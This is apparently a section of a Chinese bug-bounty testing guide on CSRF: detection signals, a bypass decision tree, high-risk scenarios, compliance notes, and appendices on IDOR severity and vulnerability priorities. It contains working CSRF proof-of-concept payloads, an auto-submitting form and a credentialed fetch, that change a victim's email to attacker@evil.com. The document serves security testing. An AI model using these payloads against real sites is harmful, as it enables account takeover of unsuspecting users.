# §25 CSRF
### 识别信号
- 状态变更请求(POST/PUT/DELETE)缺少不可预测 token
- 参数：无 `csrf` `_token` `xsrf` `authenticity_token` `nonce` 或仅有可预测的值
- Cookie: `SameSite=None` 或 `SameSite=Lax` + GET 敏感操作
- 跨域请求未验证 `Origin`/`Referer` 头

### 决策流程
```
发现状态变更端点(POST/PUT/DELETE)?
├── Step 1: Token 存在性检查
│   ├── 无 CSRF token → CSRF 可能存在 ✅
│   ├── 有 token → 删除 token 参数 → 请求仍成功? → CSRF ✅
│   └── 有 token → 置空 token= → 请求成功? → CSRF ✅
│
├── Step 2: Token 可预测性
│   → token=MD5(timestamp) → 可预测 → CSRF ✅
│   → token=固定值(每次相同) → 可重用 → CSRF ✅
│   → token 与其他用户共享 → CSRF ✅
│
├── Step 3: SameSite Cookie 检查
│   → Set-Cookie: SameSite=None + Secure → 可跨站携带 → CSRF 可触发
│   → Set-Cookie: SameSite=Lax → POST 受限, 但 GET 敏感操作仍可 CSRF
│   → Set-Cookie: SameSite=Strict → 基本防御 (仍需测 token 绕过)
│   → 无 SameSite 属性 → 现代浏览器默认 Lax → POST 有限保护
│
├── Step 4: Origin/Referer 校验
│   → 删除 Referer 头 → 请求成功? → 服务端未校验 → CSRF ✅
│   → Origin: https://evil.com → 请求成功? → 仅依赖 Origin 或校验不严 → CSRF ✅
│
└── Step 5: Content-Type 绕过
    → application/json → text/plain (绕过 CORS preflight)
    → 表单数据 → JSON (如果服务端接受多种类型)
```

### 高危 CSRF 场景
- 修改密码/邮箱/手机号 (账户接管链)
- 修改支付/提现账户
- 删除资源/订单
- 添加管理员/权限
- OAuth 绑定第三方账号
- 转账/支付确认

### Payload
```
HTML PoC 模板:
<html>
  <body>
    <form action="https://target.com/api/update-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="submit" value="Click me">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

JSON CSRF (需要 fetch + text/plain 绕过 preflight):
<script>
fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

### 关联漏洞
- OAuth 绑定无 CSRF 保护 → 强制绑定 attacker 账号 → 账户接管 §22
- JSONP + CSRF → 数据窃取 §21
- 结合 Open Redirect → 扩大 CSRF 攻击面 §24

### SRC合规
```
严重度:
  修改密码/支付/绑定 → 高危
  修改一般信息 → 中危
  非敏感操作(退出/搜索/浏览) → 低危/忽略
测试: 仅用自己注册的2个账号验证 CSRF 效果，勿影响线上用户
```

---

# 附录A：IDOR 严重度快速参考

```
Endpoint type determines base severity BEFORE data sensitivity adjustment:

  LIST ENDPOINT (returns all records in one request):
    GET /api/getuserlist → returns ALL users → direct 高危/严重 ✅
    GET /api/user/info (no param, returns all) → same as above
    GET /admin/user/list → direct 高危
    → Single request = full data exposure. No traversal needed.

  SINGLE-RESOURCE ENDPOINT (one ID = one record):
    GET /api/user/info?userId=1001 → need to traverse IDs
    → If IDs are enumerable (sequential/GUID) → 中危/高危
    → If IDs are non-enumerable → 低危/中危

  Key question: "Does ONE request give me all users, or do I need to iterate?"
  One-request-full-list → start at 高危, adjust up for data sensitivity.
```

---

# 附录B：Data-Driven Priority（来自 88,636 WooYun 案例）

| Priority | Vuln Class | Real Cases | Focus |
|----------|-----------|-----------|-------|
| P0 | SQL Injection | 27,732 | Every user-controlled DB input |
| P0 | Unauthorized Access | 14,377 | Every admin/internal endpoint |
| P1 | Logic Flaws | 8,292 | State machines, workflows, business rules |
| P1 | XSS | 7,532 | User content display + input reflection |
| P1 | Info Leak | 7,337 | API responses, error messages, source maps |
| P2 | Command Exec (RCE) | 6,826 | File ops, system calls, template engines |
| P2 | Path Traversal | 2,854 | File download/view, import/export paths |
| P2 | File Upload | 2,711 | Any multipart/form-data endpoint |
| P3 | SSRF | ~2,000 | URL/webhook/callback params |
| P3 | CSRF | ~1,800 | State-changing POST without token |
| P3 | Race Condition | ~1,200 | Coupons, payments, inventory, multi-step ops |

Decision rule: Statistics inform priority, but safety determines order.
Safe-first: IDOR/泛查询/XSS/参数Fuzz first (Phase 3), SQLi/RCE/CMD later (Phase 3.8).

---
